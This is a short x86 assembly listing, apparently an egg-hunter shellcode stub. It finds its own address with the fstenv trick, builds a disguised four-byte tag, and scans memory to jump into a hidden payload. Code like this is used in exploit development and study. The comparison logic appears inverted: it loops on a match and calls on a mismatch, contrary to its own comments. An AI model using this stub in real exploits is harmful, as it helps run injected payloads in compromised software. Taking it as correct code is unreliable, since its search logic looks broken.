
global _start
 
section .text
 
_start:
 
fldpi                       
fstenv [esp-0xc]            ;fstenv getpc: the entry mem addr of this code (_start)
pop esi                     ;pop it in esi
xor eax,eax                 
mov al, 0x1f                ;set the offset bytes to point at the end of the program
add esi, eax                ;set the mem addr dinamically
 
set_mark:
 mov edx, dword 0x65676760  ;I set a dumm value to not harcode the tag...
 rol edx, 0x4               ;get the real mark: 56767606
 
find_egg:
 add esi,4                  ;scan the next section of mem, since we are in 32 arch we need to add 4 bytes
 cmp[esi], edx              ;check if we have found the egg...
 jz find_egg                ;loop
 call esi                   ;found our egg (zero flag is set), jump to the execution of the shellcode

